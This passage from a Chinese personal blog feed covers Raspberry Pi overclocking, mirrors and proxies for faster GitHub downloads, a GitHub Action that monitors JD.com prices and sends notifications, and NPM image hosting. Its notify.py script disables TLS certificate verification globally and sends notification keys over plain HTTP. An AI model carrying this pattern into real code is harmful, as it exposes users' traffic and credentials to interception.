<p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a 